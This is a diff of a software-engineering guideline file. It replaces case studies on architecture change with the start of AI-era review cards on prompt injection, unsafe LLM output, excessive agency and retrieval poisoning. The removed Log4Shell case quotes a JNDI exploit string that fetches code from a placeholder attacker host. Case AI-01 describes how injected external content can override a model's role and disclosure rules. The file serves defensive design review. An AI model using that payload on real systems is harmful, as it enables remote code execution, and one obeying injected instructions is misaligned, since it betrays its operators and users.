@@ -1,551 +1,327 @@
 ---
-version: 3
-last_updated: "2026-03-31"
-source: bundled-domain-baseline
+version: 8
+last_updated: "2026-05-28"
+source: zero-based-software-engineering-redesign
 status: established
 ---
 
-# Software Engineering Domain — Extension Cases
-
-Classification axis: **change trigger** — cases classified by the type of change that triggers structural evolution. Cases cover both growth triggers (Cases 1–11) and shrinkage triggers (Cases 12–13).
-
-The evolution agent simulates each scenario to verify whether the existing structure breaks.
-
----
-
-## Case 1: Adding a New Feature
-
-### Situation
-
-Adding new functionality to an existing module structure without violating module boundaries or breaking existing code (Open-Closed Principle).
-
-### Case Study: Slack — Huddles (2021)
-
-Slack added real-time audio (Huddles) to an asynchronous text messaging platform. Audio requires WebRTC connections and media servers — fundamentally different infrastructure from HTTP-based messaging. Slack isolated Huddles in a separate module with its own data model, integrating with the existing workspace/channel model through defined interfaces. Existing messaging tests remained unaffected.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Module boundaries | New feature should map to a new module or extend an existing one via its public interface |
-| Dependency direction | New module must depend inward, not introduce reverse dependencies |
-| Test isolation | Existing test suites must pass without modification |
-| API surface | Public API additions must be backward compatible (new endpoints, optional fields) |
-
-### Verification Checklist
-
-- [ ] Can the feature be added as a new module without modifying existing modules? → concepts.md §Architecture Core Terms ([L2] OCP)
-- [ ] Existing tests pass without modification → logic_rules.md §Testing Logic
-- [ ] New module follows dependency direction rules → dependency_rules.md §Direction Rules
-- [ ] Public API changes are backward compatible → dependency_rules.md §API Dependency Management (Breaking vs Non-breaking Changes Classification)
-- [ ] New dependencies do not create cycles → dependency_rules.md §Acyclic Dependencies
-- [ ] Module size stays within thresholds → structure_spec.md §Quantitative Thresholds
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| structure_spec.md | Verify | §Required Module Structure Elements, §Architectural Patterns |
-| dependency_rules.md | Verify | §Direction Rules, §Acyclic Dependencies |
-| logic_rules.md | Verify | §Testing Logic, §Inter-module Contract Logic |
-| concepts.md | Potential | New terms if the feature introduces new domain concepts |
-
----
-
-## Case 2: External Dependency Change
-
-### Situation
-
-Major version upgrade of a library or framework, potentially changing API signatures or removing deprecated features.
-
-### Case Study: React — Class Components to Hooks (2019)
-
-React 16.8 replaced class component state management (`this.state`, lifecycle methods, HOCs) with Hooks (`useState`, `useEffect`). Organizations with thousands of class components (Airbnb: 30,000+) faced multi-year migrations. Codebases with container/presenter separation could migrate independently; tightly coupled codebases required file-by-file rewrites. Tests using enzyme's class-specific shallow rendering broke entirely.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Abstraction layer | Direct coupling to library means every call site is affected |
-| API surface | Changed signatures require updating all callers or writing adapters |
-| Test suite | Tests using library-specific APIs may break |
-| Migration path | Old and new patterns must coexist during migration |
-
-### Verification Checklist
-
-- [ ] Is internal code abstracted via interfaces or directly coupled? → dependency_rules.md §Direction Rules (DIP)
-- [ ] Can the impact scope be determined when API signatures change? → dependency_rules.md §Referential Integrity
-- [ ] Does a migration path exist allowing old/new coexistence? → concepts.md §Change Management Terms (Branch-by-Abstraction)
-- [ ] Are tests dependent on library internals? → logic_rules.md §Testing Logic (Test Independence)
-- [ ] Are transitive dependencies affected? → dependency_rules.md §Build/Package Dependency Rules (Transitive Dependency Management)
-- [ ] Is the lock file updated and committed? → dependency_rules.md §Build/Package Dependency Rules (Lock File Management)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| dependency_rules.md | Modify | §External Dependency Management, §Build/Package Dependency Rules |
-| structure_spec.md | Verify | §Required Relationships |
-| logic_rules.md | Verify | §Testing Logic, §Type System Logic |
-| concepts.md | Verify | §Change Management Terms |
-
----
-
-## Case 3: Schema/Data Model Change
-
-### Situation
-
-Adding, removing, or changing fields in an existing data model. Identifier format changes have especially broad impact on referential integrity.
-
-### Case Study: Twitter — Snowflake ID Migration (2010)
-
-Twitter migrated from MySQL auto-increment IDs to Snowflake, a distributed 64-bit ID system encoding timestamp, machine ID, and sequence. Auto-increment required a centralized database — unsustainable at 400M+ tweets/day. The migration required: changing all ID columns from 32-bit to 64-bit, updating every API endpoint and foreign key, verifying JavaScript compatibility (fits within `Number.MAX_SAFE_INTEGER`). A dual-write period allowed both formats to coexist.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Type system | Field type changes propagate to all consumers |
-| Referential integrity | Identifier format changes affect every foreign key and cross-service reference |
-| API compatibility | Response format changes are breaking for existing consumers |
-| Source of truth | During migration, two systems coexist — source of truth must be declared |
-
-### Verification Checklist
-
-- [ ] Does the migration preserve existing data? → structure_spec.md §Storage/Data Layer
-- [ ] Does all code referencing the model accommodate the change? → dependency_rules.md §Referential Integrity
-- [ ] Is API response backward compatibility maintained? → dependency_rules.md §API Dependency Management (Breaking vs Non-breaking Changes Classification)
-- [ ] Are database constraints updated? → logic_rules.md §Constraint Design Logic (Database vs Application Constraint Boundary)
-- [ ] Is the migration reversible and idempotent? → concepts.md §Data/State Management Terms (Migration)
-- [ ] Is schema-code alignment verified? → structure_spec.md §Golden Relationships (Schema-Code alignment)
-- [ ] Is source of truth designated during dual-write? → dependency_rules.md §Source of Truth Management
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| logic_rules.md | Modify | §Type System Logic, §Constraint Design Logic |
-| dependency_rules.md | Verify | §Referential Integrity, §API Dependency Management |
-| structure_spec.md | Verify | §Storage/Data Layer, §Golden Relationships |
-
----
-
-## Case 4: Scale Expansion
-
-### Situation
-
-10x increase in users, data, or traffic. Bottlenecks emerge at synchronous processing, shared state, and single-instance resources.
-
-### Case Study: Netflix — Monolith to Microservices (2012–2016)
-
-Netflix migrated from a monolithic Java application to 700+ microservices on AWS for 100M+ subscribers. The monolith's single database was a bottleneck, a single bug could crash everything, and deployments required all-team coordination. Key decisions: each service owns its data, inter-service calls use circuit breakers (Hystrix), eventual consistency accepted where appropriate. Netflix open-sourced Eureka (discovery), Zuul (gateway), Hystrix (circuit breaker). The migration proved microservices solve scaling but require heavy observability investment.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Module structure | Must support horizontal scaling (stateless or externalized state) |
-| Shared state | Sessions, caches, in-memory state prevent scaling if not externalized |
-| Database | Single database becomes bottleneck; read replicas, sharding, or per-service databases needed |
-| Concurrency | Race conditions invisible at low scale manifest under load |
-
-### Verification Checklist
-
-- [ ] Can bottleneck points be identified? → structure_spec.md §Quantitative Thresholds
-- [ ] Is the structure capable of horizontal scaling? → structure_spec.md §Architectural Patterns
-- [ ] Does shared state impede scaling? → logic_rules.md §State Management Logic (Distributed State Rules)
-- [ ] Are concurrency issues addressed? → logic_rules.md §Concurrency Logic
-- [ ] Are circuit breakers in place? → dependency_rules.md §Runtime Dependency Rules (Circuit Breaker)
-- [ ] Are timeout and retry policies configured? → dependency_rules.md §Runtime Dependency Rules (Timeout and Retry Policies)
-- [ ] Is observability sufficient? → domain_scope.md §Required Concept Categories (Observability)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| structure_spec.md | Modify | §Architectural Patterns, §Quantitative Thresholds |
-| dependency_rules.md | Verify | §Runtime Dependency Rules |
-| logic_rules.md | Verify | §Concurrency Logic, §State Management Logic |
-| domain_scope.md | Verify | §Required Concept Categories |
-
----
-
-## Case 5: New Deployment Environment
-
-### Situation
-
-Adding a new deployment target (on-premises → cloud, single-region → multi-region, bare metal → Kubernetes).
-
-### Case Study: Shopify — Multi-tenant Kubernetes (2019–2021)
-
-Shopify migrated from single-tenant bare-metal to multi-tenant Kubernetes for 1.7M+ merchants. Per-merchant infrastructure was expensive and couldn't handle Black Friday spikes. Migration required: separating configuration into ConfigMaps/Secrets, abstracting file system access (local disk → object storage), pod autoscaling for 10x traffic. Critical refactor: hardcoded "one database per tenant" became a routing layer directing queries by tenant ID.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Configuration separation | Environment-specific values must not be in code |
-| Infrastructure abstraction | OS-specific and platform-specific code must be abstracted |
-| Deployment pipeline | CI/CD must support multiple targets with environment-specific stages |
-| Data locality | Multi-region introduces data replication and latency considerations |
-
-### Verification Checklist
-
-- [ ] Are environment-specific settings separated from code? → structure_spec.md §Required Module Structure Elements (Configuration/Environment)
-- [ ] Is environment-dependent code abstracted? → structure_spec.md §Golden Relationships (Config-Code separation)
-- [ ] Are credentials managed via secrets, not hardcoded? → logic_rules.md §Security Logic (Authentication Logic)
-- [ ] Does CI/CD support the new environment? → structure_spec.md §Verification Structure (CI/CD Pipeline Structure)
-- [ ] Is 12-Factor App methodology followed? → domain_scope.md §Reference Standards/Frameworks
-- [ ] Are multi-region data concerns addressed? → logic_rules.md §State Management Logic (Distributed State Rules)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| structure_spec.md | Modify | §Required Module Structure Elements, §Golden Relationships, §Verification Structure |
-| dependency_rules.md | Verify | §External Dependency Management |
-| logic_rules.md | Verify | §State Management Logic, §Security Logic |
-| domain_scope.md | Verify | §Reference Standards/Frameworks |
-
----
-
-## Case 6: Team/Organization Expansion
-
-### Situation
-
-Increase in developer count leading to higher concurrent work. Conway's Law: system architecture mirrors organizational structure.
-
-### Case Study: Amazon — Two-Pizza Teams and SOA (2002–2006)
-
-Bezos mandated all teams communicate through service interfaces — no direct database access, no shared memory. Teams of 6–10 people each owned a service end-to-end. This forced monolith decomposition into hundreds of services with well-defined APIs. Benefits: independent deployment (50+ deploys/day per team by 2011), clear ownership, limited blast radius. Costs: distributed complexity, eventual consistency. Amazon built internal tools, later released as AWS services (DynamoDB, SQS, CloudWatch).
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Module boundaries | Must be clear enough for independent team work |
-| Shared code | Changes to shared libraries must not block other teams |
-| CI/CD pipeline | Must support parallel builds and per-team deployment |
-| API contracts | Inter-team communication through contracts, not direct code sharing |
-
-### Verification Checklist
-
-- [ ] Are module boundaries clear enough for independent work? → structure_spec.md §Classification Criteria Design
-- [ ] Do shared code changes not block other teams? → dependency_rules.md §Package/Module Dependency Patterns (Shared Kernel)
-- [ ] Does CI/CD support parallel builds/tests? → structure_spec.md §Verification Structure (CI/CD Pipeline Structure)
-- [ ] Are inter-module contracts explicitly defined? → logic_rules.md §Inter-module Contract Logic
-- [ ] Is dependency fan-in within threshold (≤ 20)? → structure_spec.md §Quantitative Thresholds
-- [ ] Is the dependency graph a DAG? → dependency_rules.md §Acyclic Dependencies
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| structure_spec.md | Modify | §Classification Criteria Design, §Quantitative Thresholds |
-| dependency_rules.md | Verify | §Acyclic Dependencies, §Package/Module Dependency Patterns |
-| logic_rules.md | Verify | §Inter-module Contract Logic |
-
----
-
-## Case 7: Event Sourcing Extension (when applicable)
-
-### Situation
-
-Adding new event types, states, and resume functionality to an Event Sourcing system.
-
-### Case Study: Axon Framework — Event Upcasting at ING Bank
-
-Axon Framework (AxonIQ) provides JVM-based Event Sourcing and CQRS for financial institutions. When ING added `FraudAlertRaised` to their payment pipeline: (1) projectors with catch-all handlers threw on unknown events, (2) the new `PaymentFrozen` terminal state required updating state machines that assumed `PaymentCompleted` was final, (3) old events needed compatibility with new code via `EventUpcaster` chains. Key lesson: adding an event type is a schema evolution affecting all historical data.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Event schema | New events must be forward-compatible with existing projectors |
-| Terminal states | New terminal states affect all state machines and workflow logic |
-| Replay safety | Historical events must be replayable with new projector code |
-| Partial commit | Multiple events in one business operation must be atomic |
-
-### Verification Checklist
-
-- [ ] Do existing projectors safely handle unknown events? → logic_rules.md §Type System Logic (Fundamental Type Rules)
-- [ ] Is handling defined for changed external inputs at resumption? → logic_rules.md §State Management Logic (Fundamental State Rules)
-- [ ] Do touch points grow proportionally or remain fixed when adding stages? → structure_spec.md §Architectural Patterns
-- [ ] Are new terminal states documented? → concepts.md §Data/State Management Terms (Terminal State)
-- [ ] Is partial commit prevention addressed? → logic_rules.md §State Management Logic (Fundamental State Rules)
-- [ ] Is event upcasting defined for schema evolution? → concepts.md §Data/State Management Terms (Migration)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| logic_rules.md | Modify | §State Management Logic, §Type System Logic |
-| concepts.md | Verify | §Data/State Management Terms |
-| structure_spec.md | Verify | §Architectural Patterns |
-| dependency_rules.md | Verify | §Source of Truth Management |
-
----
-
-## Case 8: Security Incident Response
-
-### Situation
-
-A security vulnerability is discovered in a dependency or the system itself. Supply chain vulnerabilities propagate through transitive dependencies.
-
-### Case Study: Log4Shell — CVE-2021-44228 (December 2021)
-
-Log4Shell was an RCE vulnerability in Apache Log4j 2, allowing code execution via crafted log message strings (`${jndi:ldap://attacker.com/exploit}`). Log4j was a transitive dependency in millions of applications — most teams didn't know they used it. Response required: scanning dependency trees 3-4 levels deep, identifying vulnerable versions (2.0-beta9 through 2.14.1), patching while maintaining compatibility, generating SBOMs for future visibility. Organizations with mature dependency management responded in hours; others took weeks.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Dependency visibility | Transitive dependencies must be enumerable |
-| Supply chain | Integrity must be verifiable via checksums and signatures |
-| Patch propagation | A library fix must propagate to all consuming applications |
-| Test regression | Patching may change behavior — tests must verify no regressions |
-
-### Verification Checklist
-
-- [ ] Can all instances of the vulnerable dependency be identified, including transitive? → dependency_rules.md §Build/Package Dependency Rules (Transitive Dependency Management)
-- [ ] Is dependency audit running in CI? → dependency_rules.md §Build/Package Dependency Rules (Dependency Security)
-- [ ] Are lock files committed and current? → dependency_rules.md §Build/Package Dependency Rules (Lock File Management)
-- [ ] Is SBOM generated? → dependency_rules.md §Build/Package Dependency Rules (Dependency Security)
-- [ ] Are defense-in-depth layers operational? → logic_rules.md §Security Logic (Input Validation Logic)
-- [ ] Are downstream consumers notified? → dependency_rules.md §External Dependency Management
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| dependency_rules.md | Modify | §Build/Package Dependency Rules, §External Dependency Management |
-| logic_rules.md | Verify | §Security Logic |
-| structure_spec.md | Verify | §Verification Structure (CI/CD Pipeline Structure) |
-| domain_scope.md | Verify | §Major Sub-areas > Security & Auth |
-
----
-
-## Case 9: API Versioning / Breaking Change
-
-### Situation
-
-A widely-used API needs breaking changes while existing consumers cannot all upgrade immediately.
-
-### Case Study: Stripe — Date-Based API Versioning
-
-Stripe pins each merchant to the API version at integration time (e.g., `2023-10-16`). Breaking changes only affect newer versions. Compatibility is maintained via "version transformers" — middleware translating between the current internal representation and each API version. Setting `Stripe-Version: 2020-08-27` routes responses through transformers undoing changes after that date. This avoids the "upgrade cliff" but accumulates complexity: each breaking change requires a bidirectional transformer tested against all active versions.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Consumer enumeration | All consumers must be identified before breaking changes |
-| Migration path | Consumers need clear, documented upgrade instructions |
-| Backward compatibility | Old versions must continue working for a defined period |
-| Contract testing | Each supported version must be tested for correct behavior |
-
-### Verification Checklist
-
-- [ ] Are all consumers of the affected API enumerated? → dependency_rules.md §Referential Integrity
-- [ ] Is the change classified as breaking or non-breaking? → dependency_rules.md §API Dependency Management (Breaking vs Non-breaking Changes Classification)
-- [ ] Is a versioning strategy selected? → dependency_rules.md §API Dependency Management (REST API Versioning Strategies)
-- [ ] Is backward compatibility maintained for the deprecation period? → concepts.md §Change Management Terms (Deprecation)
-- [ ] Are contract tests in place? → concepts.md §Testing Terms ([L3] Contract Test)
-- [ ] Are gRPC/GraphQL evolution rules followed if applicable? → dependency_rules.md §API Dependency Management
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| dependency_rules.md | Modify | §API Dependency Management, §Referential Integrity |
-| logic_rules.md | Verify | §Type System Logic, §Inter-module Contract Logic |
-| concepts.md | Verify | §Change Management Terms |
-| structure_spec.md | Verify | §Golden Relationships (Documentation-Code alignment) |
-
----
-
-## Case 10: Monolith to Microservices Migration
-
-### Situation
-
-Decomposing a monolithic application into microservices (or choosing not to). The decision must be driven by concrete requirements, not trends.
-
-### Case Study: Shopify — Modular Monolith (2019–2023)
-
-Shopify's Rails monolith serves 1.7M+ merchants ($444B+ GMV). Rather than microservices, they chose a modular monolith with Packwerk (static analysis enforcing module boundaries). Each component has `public/` (API surface) and `private/` internals — cross-component communication through public API only. Rationale: microservices would add network latency, distributed transactions, and service mesh overhead. The modular monolith achieves independent development without distributed complexity.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Bounded contexts | Each service/module must align with a domain boundary |
-| Data ownership | Each service must own its data; shared databases create distributed monoliths |
-| Transaction boundaries | Cross-service operations require sagas or eventual consistency |
-| Testing strategy | Integration tests become cross-service; E2E requires service orchestration |
-
-### Verification Checklist
-
-- [ ] Are bounded contexts identified via domain analysis? → concepts.md §Architecture Core Terms (Bounded Context)
-- [ ] Are module/service boundaries enforced? → structure_spec.md §Architectural Patterns (Modular Monolith)
-- [ ] Does each service own its data exclusively? → structure_spec.md §Storage/Data Layer
-- [ ] Are cross-service transactions handled via sagas? → logic_rules.md §State Management Logic (Saga Pattern)
-- [ ] Is inter-service communication through defined APIs? → logic_rules.md §Inter-module Contract Logic
-- [ ] Are anti-corruption layers in place? → dependency_rules.md §Package/Module Dependency Patterns (Anti-corruption Layer)
-- [ ] Is the dependency graph a DAG at the service level? → dependency_rules.md §Acyclic Dependencies
-- [ ] Are circuit breakers configured? → dependency_rules.md §Runtime Dependency Rules (Circuit Breaker)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| structure_spec.md | Modify | §Architectural Patterns, §Classification Criteria Design |
-| dependency_rules.md | Modify | §Runtime Dependency Rules, §Package/Module Dependency Patterns |
-| logic_rules.md | Verify | §State Management Logic, §Inter-module Contract Logic |
-| concepts.md | Verify | §Architecture Core Terms |
-| domain_scope.md | Verify | §Major Sub-areas > Structure & Architecture |
-
----
-
-## Case 11: Database Migration
-
-### Situation
-
-Migrating from one database system to another while guaranteeing zero data loss.
-
-### Case Study: GitHub — MySQL to Vitess (2018–2020)
-
-GitHub migrated to Vitess (clustering system from YouTube) for 5B+ API requests/day across 1,200+ MySQL hosts. MySQL's single-primary replication limited write scalability; schema migrations on 100M+ row tables took hours. Vitess provides horizontal sharding, connection pooling, and online schema migrations (gh-ost). Strategy: (1) deploy Vitess as proxy (no app changes), (2) remove cross-shard joins, (3) enable sharding for high-write tables, (4) dual-write with automated consistency checks. Zero data loss achieved by validating each step before cutover.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Data integrity | All data must be migrated without loss or corruption |
-| Zero downtime | Migration must not require application downtime |
-| Query compatibility | Application queries may need modification for new capabilities |
-| Schema differences | New database may not support all features (triggers, stored procedures) |
-
-### Verification Checklist
-
-- [ ] Is data integrity verified via automated comparison? → dependency_rules.md §Referential Integrity
-- [ ] Is a dual-write period implemented with consistency checks? → dependency_rules.md §Source of Truth Management
-- [ ] Are all queries compatible with the new database? → structure_spec.md §Storage/Data Layer
-- [ ] Is schema-code alignment verified? → structure_spec.md §Golden Relationships (Schema-Code alignment)
-- [ ] Are database constraints migrated? → logic_rules.md §Constraint Design Logic (Database vs Application Constraint Boundary)
-- [ ] Is the migration reversible at each step? → concepts.md §Data/State Management Terms (Migration)
-- [ ] Are connection strings in configuration, not code? → structure_spec.md §Golden Relationships (Config-Code separation)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| dependency_rules.md | Modify | §External Dependency Management, §Referential Integrity, §Source of Truth Management |
-| structure_spec.md | Verify | §Storage/Data Layer, §Golden Relationships |
-| logic_rules.md | Verify | §Constraint Design Logic |
-| concepts.md | Verify | §Data/State Management Terms |
-
----
-
-## Case 12: Feature Removal / Deprecation
-
-### Situation
-
-Removing an existing feature, including deprecation notice, migration path for consumers, dead code cleanup, and data retention/deletion decisions.
-
-### Case Study: Google — Google Reader Shutdown (2013)
-
-Google Reader served millions of RSS subscribers. Shutdown required: 6-month deprecation notice, Google Takeout data export for user data, API deprecation for third-party clients (Feedly, Reeder migrated 500K+ users in 3 months), redirects from old URLs. Key lesson: feature removal affects both direct users and API consumers differently.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Deprecation protocol | Must specify what, when, and replacement |
-| Dead code cleanup | Removal must not break unrelated code paths |
-| Data lifecycle | User data must be exported or archived before deletion |
-| Consumer migration | API consumers need migration guides and timeline |
-
-### Verification Checklist
-
-- [ ] Is deprecation announced with timeline and replacement? → concepts.md §Change Management Terms (Deprecation)
-- [ ] Are all consumers of the deprecated feature enumerated? → dependency_rules.md §Referential Integrity
-- [ ] Is dead code fully removed (no conditional branches for removed feature)? → structure_spec.md §Isolated Node Prohibition
-- [ ] Is user data handled (export, archive, deletion)? → domain_scope.md §Required Concept Categories (Lifecycle)
-- [ ] Are feature flags for the removed feature cleaned up? → concepts.md §Change Management Terms (Feature Toggle)
-- [ ] Are tests for the removed feature deleted to prevent confusion? → logic_rules.md §Testing Logic (Test Independence)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| concepts.md | Verify | §Change Management Terms (Deprecation, Feature Toggle) |
-| dependency_rules.md | Verify | §Referential Integrity, §API Dependency Management |
-| structure_spec.md | Verify | §Isolated Node Prohibition |
-
----
-
-## Case 13: Service Decommissioning
-
-### Situation
-
-Permanently shutting down a service, including traffic drain, data archival, dependency cleanup, and DNS/routing removal.
-
-### Case Study: AWS — SimpleDB Sunset (Gradual, 2012–)
-
-AWS SimpleDB was superseded by DynamoDB. AWS approach: no new customers accepted, existing customers given multi-year migration window, DynamoDB migration guides published, SimpleDB API maintained read-only during transition, data export tools provided. Key lesson: decommissioning a service with external consumers requires years-long migration support.
-
-### Impact Analysis
-
-| Principle | Impact |
-|---|---|
-| Traffic drain | All consumers must be migrated before shutdown |
-| Data archival | Data must be archived or migrated to successor service |
-| Dependency cleanup | All references to the service must be removed |
-| DNS/routing | Service endpoints must return informative errors, not timeouts |
-
-### Verification Checklist
-
-- [ ] Are all consumers identified and migrated? → dependency_rules.md §Referential Integrity
-- [ ] Is data archived with retention policy? → domain_scope.md §Required Concept Categories (Lifecycle)
-- [ ] Are inter-service dependencies cleaned up (no dangling references)? → dependency_rules.md §Acyclic Dependencies
-- [ ] Are monitoring/alerts for the decommissioned service removed? → domain_scope.md §Required Concept Categories (Observability)
-- [ ] Is DNS/routing updated (informative 410 Gone, not timeout)? → dependency_rules.md §API Dependency Management
-- [ ] Is the decommissioned service removed from CI/CD pipelines? → structure_spec.md §Verification Structure (CI/CD Pipeline Structure)
-
-### Affected Files
-
-| File | Impact | Section |
-|---|---|---|
-| dependency_rules.md | Modify | §Referential Integrity, §External Dependency Management |
-| structure_spec.md | Verify | §Verification Structure |
-| domain_scope.md | Verify | §Required Concept Categories |
-
----
+# Software Engineering Domain - Extension Cases
+
+This document is the case-backed guideline library for the `software-engineering`
+domain. It is consumed by review lenses through the existing review runtime, but it
+does not define, add, or govern lenses.
+
+A case is accepted only when it can support:
+
+```text
+case evidence -> principle -> guideline -> CQ seed -> PASS/FAIL criteria
+```
+
+The cases are intentionally not MECE. The same case may support multiple lenses.
+
+## Card Format
+
+Each case should answer these fields:
+
+```text
+Case ID:
+Source evidence:
+Evidence status (optional when source evidence names a dated/versioned anchor):
+Observed failure:
+Review concern relevance:
+Principle:
+Applicable when:
+Guideline:
+CQ seed:
+PASS:
+FAIL:
+Related documents:
+Supersedes (when applicable):
+Superseded by (when applicable):
+```
+
+`Review concern relevance` names domain concerns, not lens governance proposals.
+Security, operations, performance, verification, and similar labels are concern tags.
+They must route through CQ seeds, related documents, or existing review paths; they do
+not imply that a dedicated active lens exists or should be added.
+
+## Case Evidence Currency
+
+Case evidence must remain usable as standards and provider behavior change.
+
+- Published standards or frameworks should name the version, year, profile, or stable local evidence ref used when available.
+- Practice-pattern evidence with no single stable external version must be marked by descriptive source evidence and revisited when the corresponding CQ or case changes.
+- Applicability windows are expressed through `Applicable when`; replacement rules are expressed through `Supersedes` and `Superseded by` when a case's source evidence or guideline is replaced.
+- When an external anchor is superseded, the case should either update its source evidence or add a supersession note before changing the guideline.
+- `last_updated` in this file is the current review date for the case library; a case with a different review date should add local `Last reviewed` metadata.
+
+## Case ID Allocation and Lifecycle
+
+- Case IDs are stable and must not be reused after deletion or retirement.
+- `AI-*` is reserved for LLM-native, agentic, AI governance, AI supply-chain, prompt/context, retrieval, model/provider, and semantic-evaluation cases.
+- `SE-*` is reserved for general software-engineering lifecycle, architecture, dependency, verification, operations, security, accessibility, and data cases.
+- New namespaces require a reason, expected CQ family, and scenario-interconnection update.
+- A superseded case keeps its ID and adds `Superseded by`; the replacement adds `Supersedes`.
+- Scenario interconnections must reference stable case IDs, not titles alone.
+
+## AI-Era Software Engineering Cases
+
+### Case AI-01: Direct or Indirect Prompt Injection
+
+- **Source evidence**: OWASP LLM Top 10 2025 LLM01 Prompt Injection; NIST AI 600-1 GenAI profile
+- **Observed failure**: User text, webpage text, retrieved content, file content, or tool output contains instructions that override role, tool, output, disclosure, or authority rules
+- **Review concern relevance**: logic, structure, dependency, security, pragmatics, axiology
+- **Principle**: External content is data, not instruction authority. Prompt instructions are not a security boundary
+- **Applicable when**: External content enters model context and the model can influence tool calls, artifacts, user-visible decisions, or sensitive output
+- **Guideline**: Context assembly must preserve instruction hierarchy, label untrusted content, block exfiltration sinks, and test at least one hostile-content scenario when tool/authority impact exists
+- **CQ seed**: Can external content change tool permission, role authority, output authority, or secret disclosure behavior?
+- **PASS**: Runtime/context assembly treats external content as data, enforces instruction hierarchy, and records source/permission refs
+- **FAIL**: The system relies on the model alone to ignore hostile content
+- **Related documents**: concepts.md `Prompt Injection Boundary`; logic_rules.md `External Content and Prompt Injection Rules`; competency_qs.md CQ-A-16
+
+### Case AI-02: Improper LLM Output Handling
+
+- **Source evidence**: OWASP LLM Top 10 2025 LLM05 Improper Output Handling
+- **Observed failure**: Schema-valid or plausible model output is passed into shell, SQL, HTML, file, email, API, or authority-artifact sinks without sink-specific validation
+- **Review concern relevance**: logic, security, dependency, pragmatics
+- **Principle**: LLM output is untrusted until validated for the concrete downstream sink
+- **Applicable when**: Model output is consumed by code, tools, storage, UI, generated files, external messages, or authority artifacts
+- **Guideline**: Require sink-specific validation/encoding/authorization in runtime gates; do not treat prompt format instructions as validation
+- **CQ seed**: Is LLM output validated for every downstream sink before use?
+- **PASS**: Each sink declares its validation/encoding/authorization gate and trust status
+- **FAIL**: JSON validity or prompt compliance is used as proof of safety
+- **Related documents**: concepts.md `Output Zero-Trust`; prompt_interface.md `Output Sink Constraints`; competency_qs.md CQ-A-15
+
+### Case AI-03: Excessive Agency
+
+- **Source evidence**: OWASP LLM Top 10 2025 LLM06 Excessive Agency
+- **Observed failure**: An agent can use broad tools, privileged credentials, external communication, or irreversible writes because capability, permission, and autonomy were treated as one setting
+- **Review concern relevance**: structure, logic, axiology, security
+- **Principle**: Minimize agent functionality, permission, and autonomy separately
+- **Applicable when**: An LLM can choose actions, invoke tools, update state, deploy, delete, message users, or touch sensitive data
+- **Guideline**: Separate tool availability from authorization and from no-approval autonomy. Add human approval gates for high-impact actions
+- **CQ seed**: Are capability, permission, and autonomy separately bounded?
+- **PASS**: Tool registry, permission scope, approval gates, audit, and denial paths are explicit
+- **FAIL**: "Use tools as needed" grants implicit permission or autonomy
+- **Related documents**: concepts.md `Agent Functionality`, `Agent Permission`, `Agent Autonomy`; competency_qs.md CQ-A-18, CQ-G-05
+
+### Case AI-04: Vector and Embedding Weakness
+
+- **Source evidence**: OWASP LLM Top 10 2025 LLM08 Vector and Embedding Weaknesses
+- **Observed failure**: Retrieval crosses tenant/user boundaries, retrieves poisoned material, loses source provenance, or mixes incompatible embedding indexes
+- **Review concern relevance**: dependency, structure, security, coverage
+- **Principle**: RAG is a dependency and permission boundary, not just a search feature
+- **Applicable when**: External knowledge is chunked, embedded, indexed, retrieved, and injected into model context
+- **Guideline**: Validate ingestion, preserve corpus lifecycle, filter permissions before context injection, record retrieval provenance, and treat embedding/index changes as migrations
+- **CQ seed**: Can retrieved material influence claims without permission and provenance evidence?
+- **PASS**: Source validation, permission filtering, poisoning checks, index compatibility, and retrieval audit exist
+- **FAIL**: Retrieved text can cross boundaries or become evidence solely because it was relevant
+- **Related documents**: concepts.md `RAG Permission Boundary`; logic_rules.md `Retrieval and Vector Rules`; competency_qs.md CQ-A-17
+
+### Case AI-05: Model or Provider Behavior Change
+
+- **Source evidence**: NIST AI RMF, NIST AI 600-1, provider deprecation/change patterns, dependency-management practice
+- **Observed failure**: A model/provider route changes behavior, cost, latency, structured-output reliability, or safety characteristics while being treated as an implementation detail
+- **Review concern relevance**: dependency, evolution, pragmatics
+- **Principle**: Model/provider changes are behavior migrations
+- **Applicable when**: A system uses hosted/local models, version aliases, route profiles, provider-specific auth, or model-specific tool/structured-output behavior
+- **Guideline**: Record provider/model/version/alias status, compare old/new behavior with eval baselines, and list affected prompts, tools, indexes, dashboards, cost/rate assumptions, and release gates
+- **CQ seed**: Can the system evaluate a model/provider migration without hidden behavior drift?
+- **PASS**: Route facts, affected artifacts, semantic regression evidence, and rollout/rollback expectations are recorded
+- **FAIL**: A provider or model is swapped with only package/API smoke success
+- **Related documents**: dependency_rules.md `LLM/Agent Dependency Management`; competency_qs.md CQ-A-19
+
+### Case AI-06: GenAI Governance Gap
+
+- **Source evidence**: NIST AI RMF 1.0; NIST AI 600-1; ISO/IEC 42001
+- **Observed failure**: AI behavior materially affects users or release decisions but has no accountable risk owner, approval gate, transparency path, or improvement loop
+- **Review concern relevance**: axiology, coverage, pragmatics, evolution
+- **Principle**: Governance is engineering material when AI behavior affects trust, harm, release, or authority
